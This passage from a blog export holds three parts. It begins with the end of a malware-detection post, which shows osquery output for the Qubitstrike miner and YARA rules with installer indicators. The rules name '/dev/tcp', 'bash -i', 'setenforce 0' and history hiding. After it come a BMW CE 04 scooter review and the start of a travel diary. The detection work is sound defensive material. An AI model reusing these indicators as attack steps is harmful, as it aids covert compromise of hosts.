osquery\n\nSome of you might know that I also maintain the [osquery-defense-kit](https://github.com/chainguard-dev/osquery-defense-kit) project, something I've put together in my time at [Chainguard](https://chainguard.dev/). It's a collection of production-quality queries to uncover suspicious behavior using [osquery](https://www.osquery.io/).\n\n![](https://i.snap.as/ttv2DxWz.png)\n\n`osquery-defense-toolkit` has a handy `make detect` target to run all the scripts. Here's what pops up on a machine with Qubitstrike:\n\n```\npid-hidden-by-rootkit (1 rows)\n------------------------------\ncgroup_path:/user.slice/user-501.slice/session-4.scope cmdline:'/usr/share/.LQvKibDTq4/python-dev -B -o pool.hashvault.pro:80 -u 49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo -p 136.54.68.146 --donate-level 1 --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 90' cwd:/ disk_bytes_read:311296 disk_bytes_written:0 egid:0 euid:0 gid:0 name:python-dev nice:0 on_disk:1 parent:1 path:/usr/share/.LQvKibDTq4/python-dev pgroup:4030 pid:4030 resident_size:4096000 root:/ sgid:0 start_time:1697625949 state:S suid:0 system_time:23170 threads:10 total_size:2504282112 uid:0 user_time:6077320 wired_size:0\n```\n\nThis is effectively a port of the hidden-pids.sh script I showed you before:\n\n```sql\n\nWITH RECURSIVE cnt(x) AS (\n   SELECT 1\n   UNION ALL\n   SELECT x + 1\n   FROM cnt\n   LIMIT 4194304\n)\nSELECT p.*\nFROM cnt\n   JOIN processes p ON x = p.pid\nWHERE x NOT IN (\n       SELECT pid\n       FROM processes\n)\nAND p.start_time \u003c (strftime('%s', 'now') - 1)\nAND (\n       p.pgroup = p.pid\n       OR (\n           p.pid = p.parent\n           AND p.threads = 1\n       )\n)\n```\n\nosquery finds the SSH keys:\n\n```\nunexpected-ssh-authorized-keys (1 rows)\n---------------------------------------\natime:1697625779 ctime:1697625778 gid:0 mtime:1697625778 path:/root/.ssh/authorized_keys sha256:e8d5053e7c719114b45956695da845840ab45fb3e8d659f4ed991b274a8ed7a8 size:563 u_uid:0 uid:0 username:root\n```\n\nAs well as the kernel taint:\n\n```\nunusually-tainted-kernel-linux (1 rows)\n---------------------------------------\nforce_loaded:0 force_unloaded:0 is_aux:0 is_unsigned:8192 kernel_warning:0 modules:nft_compat,nft_chain_nat,overlay,xt_tcpudp,xt_nat,xt_multiport,xt_mark,xt_conntrack,xt_comment,xt_addrtype,xt_MASQUERADE,nf_tables,nfnetlink,ip6table_filter,iptable_filter,ip6table_nat,iptable_nat,nf_nat,nf_conntrack,nf_defrag_ipv6,nf_defrag_ipv4,ip6_tables,veth,bridge,stp,llc,tap,tls,isofs,kvm_amd,ccp,binfmt_misc,kvm,irqbypass,virtio_input,nls_iso8859_1,input_leds,serio_raw,dm_multipath,scsi_dh_rdac,scsi_dh_emc,scsi_dh_alua,efi_pstore,ip_tables,x_tables,autofs4,btrfs,blake2b_generic,raid10,raid456,async_raid6_recov,async_memcpy,async_pq,async_xor,async_tx,xor,raid6_pq,libcrc32c,raid1,raid0,multipath,linear,virtio_gpu,virtio_dma_buf,drm_shmem_helper,drm_kms_helper,syscopyarea,sysfillrect,sysimgblt,psmouse,ahci,virtio_net,drm,libahci,net_failover,virtio_blk,xhci_pci,xhci_pci_renesas,virtio_rng,failover out_of_spec:0 out_of_tree:4096 proprietary:0 requested_by_userspace:0 taint:12288\n```\n\nTo look at the source code to these queries, see:\n\n* [pid-hidden-by-rootkit.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/evasion/pid-hidden-by-rootkit.sql)\n* [unexpected-ssh-authorized-keys.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/persistence/unexpected-ssh-authorized-keys.sql)\n* [unusually-tainted-kernel-linux.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/evasion/unusually-tainted-kernel-linux.sql)\n\nThese queries were written way before QubitStrike ever existed; they just happen to cover a broad set of malicious behavior. It's nice when old tricks still work on new dogs.\n\n## Detecting Qubitstrike with YARA\n\n![](https://i.snap.as/9grhf7eX.png)\n\nThe original article by Cado had a very specific rule for the QubitStrike installer. Still, it's worth mentioning that generic malware detection rules that predate QubitStrike are equally as good at detecting not just the QubitStrike, but also the files it installs: Using a set of general-purpose YARA rules I plan to open-source, the QubitStrike installer triggered a record 22 different rules:\n\n```log\nCRITICAL /Users/t/src/malware-menagerie/linux/2023.Trojan_Miner.QubitStrike/installer/mi.sh\n  * router_malware\n      usr_sbin: /usr/sbin\n      wget: /wget\n      curl: /curl\n  * ld_so_preload\n      ld_so_preload: /etc/ld.so.preload\n  * systemctl_calls\n      systemctl_disable: systemctl disable\n  * linux_service_disabler\n      setenforce_0: setenforce 0\n      selinux_disabled: SELINUX=disabled\n      watchdog: kernel.nmi_watchdog=0\n  * linux_pkg_installer_command\n      yum: yum install -y\n  * danger_base64_decoder\n      base64_d: base64 -d\n  * echo_decode_bash\n      echo: echo\n      base64_d: base64 -d\n      bash: bash\n  * hardcoded_var_tmp_location\n      var_tmp: /var/tmp/.\n  * obfuscated_base64\n      b_c_program: I2luY2x1ZGUgPHN0ZGlvLmg+\n      b_user_rootkit: jaW5jbHVkZSA8ZGlyZW50Lmg+\n      b_gzip: H4sI\n  * hide_this_plz\n      histfile: HISTFILE=\n      histfile_dev: HISTFILE=/dev\n  * kill_and_remove\n      rm_f: rm -f\n      rm_rf: rm -rf\n      k_killall: killall\n      k_pgrep: pgrep\n      k_pkill: pkill\n  * rm_f_hardcoded_tmp_path\n      rm_f_tmp_var_dev: rm -rf /tmp/.LQvKibDTq4/\n  * crontab_writer\n      c_etc_crontab: /etc/crontab\n      c_root_cron_entry: * * * * root\n      c_reboot: @reboot\n  * hidden_path\n      crit: /tmp/.LQvKibDTq4\n  * weird_tmp_path_not_hidden\n      tmp_digits: /tmp/65\n      tmp_short: /tmp/.$\n  * chattr_caller\n      chattr: chattr -\n  * ssh_key_access\n      ssh_authorized_keys: authorized_keys\n      ssh_dir: /.ssh\n  * recon_commands\n      c_whoami: whoami\n      c_id: id\n      c_hostname: hostname\n      c_ifconfig: ifconfig\n  * suspicious_fetch_command\n      curl_d: curl -o\n      curl_insecure: curl --silent --insecure\n  * hardcoded_dns_resolver\n      d_google_public: 8.8.8.8\n  * danger_crypto_miner\n      crypto_pool: crypto-pool\n      f2pool: f2pool\n      monero_hash: monerohash\n      monero_pool: moneropool\n      xmrpool: xmrpool\n      xmrig: xmrig\n```\n\nMost of the queries are self-evident, but I'll share one of the cooler queries I use to detect malware that is hiding data away in base64 encoded blobs:\n\n```yara\nrule obfuscated_base64 {\n    $b_chmod = \"chmod\" base64\n    $b_curl = \"curl \" base64\n    $b_bin_sh = \"/bin/sh\" base64\n    $b_bin_bash = \"/bin/bash\" base64\n    $b_openssl = \"openssl\" base64\n    $b_dev_null = \"/dev/null\" base64\n    $b_user_agent = \"User-Agent\" base64\n    $b_usr_bin = \"/usr/bin\" base64\n    $b_usr_sbin = \"/usr/sbin\" base64\n    $b_var_tmp = \"/var/tmp\" base64\n    $b_var_run = \"/var/run\" base64\n    $b_screen_dm = \"screen -dm\" base64\n    $b_zmodload = \"zmodload\" base64\n    $b_dev_tcp = \"/dev/tcp\" base64\n    $b_bash_i = \"bash -i\" base64\n    $b_bash_c = \"bash -c\" base64\n    $b_http = \"http://\" base64\n    $b_https = \"https://\" base64\n    $b_c_program = \"#include \u003cstdio.h\u003e\" base64\n    $b_user_rootkit = \"#include \u003cdirent.h\u003e\" base64\n    $b_kernel_rootkit = \"#include \u003clinux/module.h\u003e\" base64\n    $b_c_program2 = \"#include\u003cstdio.h\u003e\" base64\n    $b_user_rootkit2 = \"#include\u003cdirent.h\u003e\" base64\n    $b_kernel_rootkit2 = \"#include\u003clinux/module.h\u003e\" base64\n    $b_password = \"password\" base64\n    $b_gzip = \"H4sI\"\n    $not_kandji = \"kandji-parameter-agent\"\n    $not_kolide = \"KOLIDE_LAUNCHER_OPTION\"\n    $not_mdmprofile = \"mdmprofile\"\n    $not_chromium = \"RasterCHROMIUM\"\n    $not_cert = \"-----BEGIN CERTIFICATE-----\"\n  condition:\n    filesize \u003c 10485760 and any of ($b_*) and none of ($not_*)\n}\n```\n\nMy rules have not attempted to detect rootkit source code yet, but surprisingly, this exceptionally broad rule worked to discover Diamorphine:\n\n```yara\nrule suspicious_keywords {\n  strings:\n    $DDoS = \"DDoS\"\n    $DD0S = \"DD0S\"\n    $backdoor = \"backdoor\"\n    $Backdoor = \"Backdoor\"\n    $backd00r = \"backd00r\"\n    $rootkit = \"rootkit\"\n    $Rootkit = \"Rootkit\"\n    $r00tkit = \"r00tkit\"\n    $r00tk1t = \"r00tk1t\"\n    $trojan = \"trojan\"\n    $Trojan = \"Trojan\"\n    $tr0jan = \"tr0jan\"\n  condition:\n    any of them\n}\n```\n\nThis simple rule to detect usermode rootkits caught the `prochide.c`:\n\n```yara\nrule userspace_process_hider {\n  strings:\n    $prochide = \"processhide\"\n    $proc_to_filter = \"process_to_filter\"\n    $readdir_override = \"original_readdir\"\n  condition:\n    any of them\n}\n```\n\nThe `python-dev` xmrig program triggered 8 different rules. I'll share one of the more creative ones:\n\n```yara\nrule probably_a_linux_miner {\n  strings:\n    $argon = \"argon2d\"\n    $proc_self = \"/proc/self\"\n    $numa = \"NUMA\"\n  condition:\n    all of them\n}\n```\n\nIf you want to see some YARA queries specifically tuned for finding Linux rootkits, [dmknght/rkcheck](https://github.com/dmknght/rkcheck/blob/main/rules/rootkit.yar) is a good reference.\n\n## Detecting using gut instinct\n\nIf you ever see a host with a load of 5.0+ and no high-CPU processes, chances are you have been infected with a hidden crypto-miner. No rootkit I've seen on Linux attempts to manipulate load values.\n\n## Wrapping Up\n\nI hope you had fun through this tour. If you have any questions or malware samples to share, feel free to contact me at thomas(%2b)stromberg.org","tags":["Port","PermitRootLogin","include"],"categories":[{"hashtag":"Port","slug":"port","title":"port","post_count":0},{"hashtag":"PermitRootLogin","slug":"permit-root-login","title":"permit root login","post_count":0},{"hashtag":"include","slug":"include","title":"include","post_count":0}],"images":["https://i.snap.as/KuU2dMIe.webp","https://i.snap.as/jsHYhB4p.png","https://i.snap.as/qkVrmeCD.jpg","https://i.snap.as/kSYk4Avb.webp","https://i.snap.as/l4InqXJW.jpg","https://i.snap.as/7P7847lO.jpg","https://i.snap.as/7Z1S4bxi.png","https://i.snap.as/8SIolL5k.png","https://i.snap.as/aArwlOKd.webp","https://i.snap.as/CV7Rixe9.png","https://i.snap.as/KVms6GJG.png","https://i.snap.as/ttv2DxWz.png","https://i.snap.as/9grhf7eX.png"],"paid":false,"full_post_url":"","views":575,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"p8y2tnxs261cjzr0","slug":"bmw-ce-04-the-suit-and-tie-rocket-ship","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-08-13T02:07:09Z","updated":"2023-08-14T01:10:05Z","title":"BMW CE 04: The Suit \u0026 Tie Rocket Ship","body":"With 4,700 miles (7500km) and 9 months under my belt, it's time for my long-term review of the BMW CE 04.\n\n## Introduction\n\n![](https://i.snap.as/Kq5EEoUX.jpg)\n\nIn 2022, BMW released the [CE 04](https://www.bmwmotorcycles.com/en/models/urban_mobility/ce04.html): a futuristic-looking spaceship in a sea of boring two-wheeled EVs. It made quite a splash, with BMW [selling nearly 5000 ](https://www.press.bmwgroup.com/global/article/detail/T0407526EN/bmw-motorrad-achieves-the-best-sales-result-in-the-company-s-history?language=en)in the first year. While European sales were strong, I estimate that only about 250 were sold in the USA during 2022. I may, in fact be the only CE 04 owner in North Carolina.\n\n\u003c!--more--\u003e\n\n![](https://i.snap.as/RcIlxAaF.jpg)\n\nOne question I often get from onlookers is: is that thing a scooter, or is that a motorcycle? While the CE 04 shares parts with their motorcycle line (S1000XR, F850GS, etc.), it has a floorboard instead of foot pegs, so BMW calls it a scooter. With the transition to electric, there is no other difference between a scooter and a motorcycle. Scooters also generally have an area under the dash where you can place your legs or groceries, but the CE 04 does not.\n\nWhile the CE 04 is the most fun I've had on two wheels, it is also the personification of compromise. It's heavy, but due to the exceptionally low center of gravity, it's far easier to handle than the equally heavy R1200GS. Rather than using new electric technologies like a hub motor, the CE 04 reuses well-tested components. Somehow, it is still the [most efficient EV in its class (WMTC 3b)](https://docs.google.com/spreadsheets/d/1UqNHMZnefVYDFB7FNf4Txf_y9nb_1LSSzdp-XJTrihg/edit#gid=0). It's got more range than you need for the city, but less than you may want for touring.\n\n![](https://i.snap.as/hOzDWXKS.jpg)\n\n## Who should get this bike?\n\nIf you are looking for a fast, fun, practical utility bike, have access to a power outlet at home, and live within 30 miles (50km) of another EV charger ([see the Plugshare map](https://www.plugshare.com/)): skip the rest of this review and go buy a CE 04 now.\n\nIf you ride primarily in urban or suburban areas, I can't think of a better bike than the CE 04.\n\n![](https://i.snap.as/xdvj5bnA.jpg)\n\n## Who should steer clear of it?\n\nIf you want to participate in long group rides or want to venture out on day-long rides without micro-managing charging stops: check out [Energica](https://www.energicamotor.com/) or [Verge Motorcycles](https://vergemotorcycles.com/) instead.\n\n![](https://i.snap.as/XA938mA3.jpg)\n\n## Specs\n\n* Top Speed: 78mph\n* Approximate Range:\n  * 75 miles @ 35mph / 120 km @ 60km/h\n  * 65 miles @ 45mph / 105 km @ 70km/h\n  * 60 miles @ 55mph / 95 km @ 90km/h\n  * 40 miles @ 70mph / 65 km @ 115km/h\n* Acceleration: 0-30mph (0-50km/h) in [\\~2s](https://www.youtube.com/watch?v=yAO1J98YK3g)\n* Maintenance: Every 2 years or 6200 miles (10000km)\n* Battery: 8.9 kWh total (8.5 kWh usable)\n* Effective charge time: \\~1 hour @ 30A (240V) with the \"Quick Charge\" option\n\n![](https://i.snap.as/fbPUsYK5.jpg)\n\n## What's Hot, What's Not?\n\nKeeping in mind that I am using the CE 04 as both a utility vehicle and a sport touring vehicle in North Carolina:\n\n**Hot**:\n\n* Brisk acceleration\n* Agile \u0026 easy to ride\n* Inexpensive to fuel ($1.15 where I live)\n* Always waking up to a full tank\n* Lack of engine noise and vibration makes it easier to tune into your surroundings\n* Leg protection\n* Reverse gear\n* Heated seat \u0026 hand-grips\n* 30L of under-seat storage\n\n![](https://i.snap.as/UIwHuER1.jpg)\n\n**Not so hot**:\n\n* Range anxiety is real\n* Seats are uncomfortable for multi-hour rides\n* AC charging only; no support for DC fast chargers.\n* [Fragile rear indicator lights](https://unfinished.bike/bmw-ce-04-indicator-replacement-procedure)\n\n![](https://i.snap.as/P3F5Tqz1.jpg)\n\n## That Acceleration Tho\n\nThe CE 04 accelerates like a bat out of hell. If you crank the throttle all the way in \"Road\" or \"Dynamic\" mode, it will calmly and quietly reach 30km/h (18mph) before the first second is up. The lack of any perceived stress from the scooter when launching it from an intersection is uncanny. The traction control system limits the earliest stage of acceleration to avoid lofting the front wheel or throwing a passenger off the back.\n\nThe acceleration still pulls aggressively through 60 km (37mph), enough to leave anything short of a supercar in the dust when leaving an intersection. After 72 km (45mph), the acceleration is no longer shocking and feels like a regular modern vehicle.\n\nLeaving everyone else behind at a green light is the most enjoyable part of owning the CE 04.\n\n![](https://i.snap.as/noRtLkk7.jpg)\n\n## How does it ride?\n\nThe BMW CE 04 rides really well, especially considering its weight. The center of gravity on this bike is easier lower than anything BMW has ever produced, which makes it a far more enjoyable experience to take this bike into town than the GS I used to have.\n\n![](https://i.snap.as/slEF34EI.jpg)\n\nI've ridden the CE 04 in gravel, double-track, cities, highways, rain, flooded roads, and even briefly on ice. So far, the biggest handling surprise has been how competent this bike feels in gravel. The bike is also good on the highway or two-up, where it behaves much better than a F650GS and nearly as good as a R1200GS.\n\n![](https://i.snap.as/7aWaTXpO.jpg)\n\nI can only find two faults with the bike handling:\n\n* The suspension is good, but you may periodically hit the travel limit (110mm front, 92mm rear) on a rough road\n* The steering of the CE 04 feels more easily influenced by high-speed crosswinds than other bikes\n\n![](https://i.snap.as/TpoCu6AB.jpg)\n\n## The Electric Experience\n\nThe best two things about having an electric vehicle are:\n\n* Near-zero maintenance\n* Never having to visit a gas station\n\nThe worst parts are:\n\n* The fear of exceeding your range\n* The fear of arriving at a broken charger\n\nIt was only on my first multi-day trip with the CE 04 that I finally mastered the art of dialing up efficiency as needed. If you find yourself in a situation where you need to stretch your range, the following recipe is good to squeeze an extra 10-15% out of the scoot:\n\n* Travel at 5mph (8km/h) less than the speed limit\n* Use \"Eco\" Mode\n* Avoid the brakes\n\n![](https://i.snap.as/qxoBRpMo.jpg)\n\nI was surprised to learn that power usage has a cubic relationship with velocity:\n\n```\npower = 0.5 * density_of_air * velocity^3 * drag coefficient * surface area\n```\n\nThis is much more noticeable on a two-wheeled EV than any other type of vehicle because of the high drag coefficient (\u003e1 versus 0.23 in a Tesla Model Y), low energy density, and because they are highly efficient at slow speeds, whereas internal combustion engines are not. Even a small difference in speed dramatically impacts the range of EVs, especially a two-wheeled one.\n\n![](https://i.snap.as/4ITjZN9r.jpg)\n\nI've observed a 23% range difference between \"Dynamic\" and \"Eco\" modes on the same stretch of road an hour apart. While the Dynamic mode has \\~20% stronger regenerative braking than Eco, I'm skeptical of its effectiveness on a two-wheeled EV due to the relatively low inertial weight. The primary efficiency difference between the Evo/Rain and Road/Dynamic modes is due to the dampening of the acceleration curve.\n\nRegarding the fear of arriving at a broken charger: I've now charged at 66 different locations and have only once had to adjust my route due to an unavailable charger. The key to avoiding charger disappointment is to look stations up on [PlugShare](https://plugshare.com) ahead of time: if the most recent review doesn't reflect a successful charge, don't count on having one yourself.\n\n![](https://i.snap.as/XXPIGkw0.jpg)\n\nLike most battery-powered devices, it takes about the same time to charge 20-80% as it does from 80-100% due to increased resistance from the battery. My average charge time at public chargers is 30 minutes (20-60%), but if I need to change up to 100% to make it somewhere, I'll grab a coffee and let the bike sit for an hour.\n\nIt is worth noting that the BMW CE 04 is only compatible with AC (alternating current) chargers, like what you have at home. While this means you can charge it from any 110V or 220V power source, it means that it isn't compatible with the faster [DC (direct current) chargers](https://evsafecharge.com/dc-fast-charging-explained/). Due to this incompatibility, even with an adapter, the CE 04 will not charge at  Tesla Superchargers or [ElectrifyAmerica](https://www.electrifyamerica.com/) chargers. In the United States, the lack of DC support means roughly 15% of chargers are incompatible with the CE 04.\n\nOn the plus side, the various apps for looking up chargers allow you to select AC or DC. 99% of the free chargers are AC. The CE 04 works wonderfully with [Tesla Destination Chargers](https://www.tesla.com/destination-charging), but you'll need to pack a [TeslaTap Mini](http://www.umc-j1772.com/index.php?route=product/product\u0026product_id=146) adapter to use them.\n\n![](https://i.snap.as/53Xyn1EV.jpg)\n\nAs the BMW CE 04 is slow at refueling compared to traditional two-wheeled bikes, group rides longer than 50 miles can be awkward. It doesn't help that group rides tend to encourage riding faster than the speed limit, which impacts your range.\n\n## Getting Connected\n\nWhile the CE 04 does not require a cell phone to operate, you will need it if you want the giant 10.25\" screen to show navigation instructions; you will need to install an Android or iOS application and connect your phone to your bike via Bluetooth. Good thing the scooter comes with a USB-C charging slot -- the CE 04 even has a fan-cooled location for stowing your phone.\n\nThere is no support for Android Auto, CarPlay, or any other mechanism to display maps from your phone to the console. If you want Navigation, you have to use the [BMW Motorrad Connected](https://play.google.com/store/apps/details?id=com.bmw.ConnectedRide.na\u0026hl=en_US\u0026gl=US) app, which isn't all that terrible.\n\n![](https://i.snap.as/gFuVGfIy.jpg)\n\nThe best features of the BMW-connected software are:\n\n* You can set the preferred \"Windiness\" for your route\n* Maps work offline\n* It records a GPS route of every ride, along with the state-of-charge, ABS, and traction events.\n\nThe worst features are:\n\n* It will not tell you how much range to expect at your destination\n* It will not warn you if the destination exceeds your range\n* It will not route you to a charging stop along the way\n* It does not show chargers on the map\n* Address lookups are sluggish and interrupted by Bluetooth connectivity changes\n* If you have your phone setup as a hotspot, it will fail to display maps on your console\n\n![](https://i.snap.as/9PL0ADkJ.jpg)\n\n## Does it Tour?\n\nHell, yes, it tours.\n\n![](https://i.snap.as/8QT5FgqW.jpg)\n\nYou can treat the BMW CE 04 as an exotic electric sport-touring machine, within reason. Due to the recharge times, the longest you can travel within 24 hours is about 400 mi/650km. My [longest single-day ride has been 333 mi/530km](https://unfinished.bike/piggly-wiggly-saves-the-electric-coastal-raid), and my longest [3-day trip has been 650 mi/1050km](https://unfinished.bike/iso-native-lands-day-1-chapel-hill-rutherfordton).\n\n![](https://i.snap.as/RbgTUkdy.jpg)\n\nTouring with the BMW CE 04 takes planning, but visiting small towns with tiny independent charging stations in pedestrian-friendly spaces has been surprisingly rewarding. Traveling at a slower speed to these little electrical oases has provided a more exciting travel experience than I ever had with the F650GS Dakar or R1150GS. By preferring slower travel speeds and making loads of coffee stops, touring on the CE 04 feels similar to a bicycle tour at 3X speed.\n\n![](https://i.snap.as/BENQlhHi.jpg)\n\nYou can find chargers even in North Carolina's one-stoplight towns: Goldston to Star. The limited range of the CE 04 requires planning to locate them, but you can go a long way with ABRP (ABetterRoutePlanner) and PlugShare. ABRP does not know about the CE 04, but it's possible to simulate one by selecting the `Zero SDS ZF 7.2 + PT` and setting the reference consumption to `190 Wh/mi @ 65mph`.\n\nThe weakest spot for touring on the BMW CE 04 is the seat. I am still looking for a seating position that is comfortable for more than 4 hours. For my pillion, it's uncomfortable after an hour. I may consider buying an [Airhawk seat](https://airhawk.net/) in the future.\n\n![](https://i.snap.as/f2JtOg5h.jpg)\n\n## Making the CE 04 mine\n\nI've made a handful of changes to the bike to make it more comfortable:\n\n![](https://i.snap.as/kYWypUuR.jpg)\n\n* [Wunderlich handguards](https://www.wunderlichamerica.com/wunderlich-handguard-set-ce-04.html): Increased protection and decreased heat loss from the heated handgrips when it's cold.\n* [Shad SH48 top case](https://www.shadusa.com/products/sh48-top-case-silver): to carry helmet \u0026 gear for a passenger.\n* [Skene lights](https://unfinished.bike/skene-lights-installation-on-the-bmw-ce-04): significantly improve visibility for the drivers around me\n* [2x2 Cycles Moto Bicycle Carrier](https://www.2x2cycles.com/product/moto-bicycle-rack/): to carry a bicycle on the back (warning: beware of clearance problems with the standard front-wheel mount to your turn signal indicator)\n* [Wunderlich Winter Muffs](https://www.wunderlichamerica.com/Motorcycle_Handlebar_Muffs_Black): to keep my fingers warm even when it's below freezing\n* [Helix Handlebar Bag](https://chromeindustries.com/products/helix-handlebar-bag) - Velcroed to the space under the dash, holds my camera, first aid kit, and TeslaTap Mini.\n* Reinforced turn signal indicators: (a tie wrap)\n\nI've been happy with all of these so far. There are many CE 04 accessories available to the EU market that may never show up in the USA, such as the [Wunderlich Rain Skirt](https://www.wunderlich.de/shop/en/leg-protection-cover-ce-04-45302-002.html).\n\n![](https://i.snap.as/MDu5sboQ.jpg)\n\n## Maintenance\n\nUnsurprisingly, the [maintenance requirements of the BMW CE 04](https://manuals.bmw-motorrad.com/manuals/BA-Extern/IN/BA-INTERNET-COM/PDF/C_0C51_RM_0623_07.pdf) are minimal. There is no engine oil that needs changing, and with the regenerative motor braking, the brake pads are, for the most part, relegated to emergency stops. I am not a mechanic, but this is the rough maintenance schedule I am going by:\n\n* 750 miles: Initial \"break-in\" service (final drive fluid change, belt tension check)\n* Every 4500 miles: replace the front tire\n* Every 6200 miles: replace the rear tire, final drive fluid change, belt tension check\n* Every 20000 miles: replace the belt\n* Every 50000 miles: replace brake pads\n* Every 10000 miles: replace brake rotors\n* Every 2 years: replace brake fluid\n\n![](https://i.snap.as/qOiuEPYr.jpg)\n\nAs with their gas-burning bikes, BMW wants you to stop by a dealer every 6000 miles for maintenance. IMHO, that's excessive for an electric vehicle, especially given that the mechanics in the USA are not trained to work on the CE 04. If you ever find yourself wanting to turn off the giant \"MAINTENANCE DUE\" pop-up on the console, it's quickly done with an [ODB2 dongle](https://www.obdlink.com/products/obdlink-lx/) and the [MotoScan](https://play.google.com/store/apps/details?id=de.wgsoft.motoscan\u0026hl=en_US\u0026gl=US) phone app.\n\n![](https://i.snap.as/licTJH9v.jpg)\n\nOne unexpected quirk about the CE 04 is that it burns through front tires more quickly than the rear, opposite of most two-wheeled vehicles and 4-wheeled EVs.\n\n![](https://i.snap.as/pOolO1eF.jpg)\n\n## Room for Improvement\n\nRoughly in priority order:\n\n* A long-range version, like the [BMW C-Evolution](https://en.wikipedia.org/wiki/BMW_C_evolution)\n* Support for DC charging ([NACS](https://en.wikipedia.org/wiki/North_American_Charging_Standard)) to broaden charger compatibility\n* Automatic routing to chargers in navigation mode\n* Touring-friendly seats\n* Reinforced indicators\n\n![](https://i.snap.as/JAE0apEV.jpg)\n\n## Conclusion\n\nIt isn't for everyone, but for me, the BMW CE 04 is a nearly perfect vehicle. It's great for errands, such as pizza pickups and school drop-offs, and fun outings, such as lunch with friends and exploring the countryside. \n\nI'd buy the CE 04 again in a heartbeat. If BMW released a version with 20mi/30km more range, I'd buy it too.\n\nIf you want to know more, drop by the [BMW Scooters Forum](https://bmw-scooters.com/), where everyone is exceptionally friendly and helpful.\n\n![](https://i.snap.as/gqYl82OY.jpg)","tags":[],"images":["https://i.snap.as/Kq5EEoUX.jpg","https://i.snap.as/RcIlxAaF.jpg","https://i.snap.as/hOzDWXKS.jpg","https://i.snap.as/xdvj5bnA.jpg","https://i.snap.as/XA938mA3.jpg","https://i.snap.as/fbPUsYK5.jpg","https://i.snap.as/UIwHuER1.jpg","https://i.snap.as/P3F5Tqz1.jpg","https://i.snap.as/noRtLkk7.jpg","https://i.snap.as/slEF34EI.jpg","https://i.snap.as/7aWaTXpO.jpg","https://i.snap.as/TpoCu6AB.jpg","https://i.snap.as/qxoBRpMo.jpg","https://i.snap.as/4ITjZN9r.jpg","https://i.snap.as/XXPIGkw0.jpg","https://i.snap.as/53Xyn1EV.jpg","https://i.snap.as/gFuVGfIy.jpg","https://i.snap.as/9PL0ADkJ.jpg","https://i.snap.as/8QT5FgqW.jpg","https://i.snap.as/RbgTUkdy.jpg","https://i.snap.as/BENQlhHi.jpg","https://i.snap.as/f2JtOg5h.jpg","https://i.snap.as/kYWypUuR.jpg","https://i.snap.as/MDu5sboQ.jpg","https://i.snap.as/qOiuEPYr.jpg","https://i.snap.as/licTJH9v.jpg","https://i.snap.as/pOolO1eF.jpg","https://i.snap.as/JAE0apEV.jpg","https://i.snap.as/gqYl82OY.jpg"],"paid":false,"full_post_url":"","views":852,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"sxsml1o8r2jr1xon","slug":"iso-native-lands-day-3-hickory-chapel-hill","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-07-17T01:05:44Z","updated":"2023-07-23T01:09:48Z","title":"ISO Native Lands: Day 3 (Hickory↝Chapel Hill)","body":"Today is homeward bound: a final 204 miles through Central North Carolina. There are a couple of locations of historical interest that I have plans to stop by: The Trading Ford, Sapona, and the Keyauwee village. I'm not keeping my hopes up too high, though, as the exact locations of each are murky and possibly on private property.\n\n![](https://i.snap.as/Jlh3yLqz.jpg)\n\n\u003c!--more--\u003e\n\nWanting to get as much distance as possible before the evil day star becomes intolerable, I set my sights on breakfast in Salisbury, 54 miles away. That's about the maximum distance I'll ride anyways on rural highways before recharging the scooter: [ABetterRoutePlanner](https://abetterrouteplanner.com/) says I'll arrive downtown with a 13% charge. The plan is to park \u0026 walk to breakfast: though apparently, the only breakfast option on a Sunday morning in Salisbury is Waffle House.\n\nI decide to make an attempt to stretch the range out as far as I can this morning: this means easing the throttle, going just below the speed limit, pulling out when folks show up behind me, and coasting to a stop using the regenerative \"engine\" braking rather than applying the brakes. Thankfully, country roads are plenty quiet at 7am on a Sunday morning.\n\n![](https://i.snap.as/utXyrLg8.jpg)\n\nMuch of this first leg is in the vicinity of Statesville, NC. The scene is ranch houses, monstrous industrial buildings, semi-truck trailers, small rural churches, and corn. This area is known for cheap land, power, and water, so it makes sense to see all the big-named companies with multiple entrances, but it still feels unlike anywhere else I've been on this trip.\n\n![](https://i.snap.as/lBkSaTgR.jpg)\n\nDepressingly, I began to think about how the local population lives their lives as slaves to these giant faceless corporations: you spend your 40 hours a week in a giant box following orders from your company, then you visit the church on the weekend to get orders from someone else, go home to rest, and then you die. I realized that I had just summarized my own life and felt even more solemn after that.\n\n![](https://i.snap.as/kRuuEC42.jpg)\n\nI arrive at the first charger with 22% charge left - 9% more than I would have usually expected and worth about an extra 6 miles in range. It's good to know that I can dial up the efficiency if needed, which has led me to a new EV mantra of \"Get low? Go slow\".\n\n![](https://i.snap.as/BC92fKQ4.jpg)\n\nSalisbury, or more specifically Gateway Park, is the first place I've parked my bike where things felt sketchy enough to bring my things with me instead of just concealing the side bag. To the left of me were two people packing their belongings into a shopping cart, and to the right was someone sleeping in a bus shelter curled up against a Huffy bike from the 90s. Salisbury has fallen a long way since [Andrew Jackson practiced law here](https://www.salisburypost.com/2017/03/19/presidential-lore-andrew-jackson-crawford-family-salisbury/).\n\n![](https://i.snap.as/z4TH9Tkw.jpg)\n\nEven at 8:30am, it's beginning to feel sticky outside. The food at the Waffle House is good but not great. I was not feeling the Salisbury vibe and questioned whether it was wise to leave my motorcycle jacket and airbag vest behind, so I 